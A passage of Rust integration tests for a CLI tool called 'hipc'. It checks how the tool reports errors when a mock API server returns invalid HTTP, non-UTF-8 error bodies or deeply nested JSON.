            .run(&["api", "GET", path])
            .fails(1, "internal");
        assert_eq!(error["retryable"], false, "{path}");
        assert!(
            error["message"]
                .as_str()
                .unwrap()
                .ends_with("is not valid HTTP"),
            "{error}"
        );
    }
    let error = Hipc::against(&home, &server)
        .run(&["api", "POST", "/control/", "--yes"])
        .fails(1, "internal");
    assert_eq!(error["side_effects"], "partial");
    assert_eq!(error["hint"], hippius::CHECK_FIRST_HINT);
}

/// An error body that is not UTF-8, or nested past what the JSON reader takes, is left out of
/// `details`, and the status decides.
#[test]
fn an_error_body_hipc_cannot_read_is_left_to_the_status() {
    let deep = "[".repeat(10_000) + &"]".repeat(10_000);
    let server = Server::start(vec![
        route(
            "GET",
            "/api/bytes/",
            Reply::bytes(400, "application/json", b"{\"detail\":\"\xff\xfe\"}"),
        ),
        route("GET", "/api/deep/", Reply::json(400, &deep)),
    ]);
    let home = Home::new();
    for path in ["/bytes/", "/deep/"] {
        let error = Hipc::against(&home, &server)
            .run(&["api", "GET", path])
            .fails(1, "validation");
        assert_eq!(
            error["message"],
            format!(
                "cannot call `GET {}/api{path}`: the API answered 400",
                server.url()
            )
        );
        assert_eq!(error["details"], serde_json::Value::Null, "{error}");
    }
}
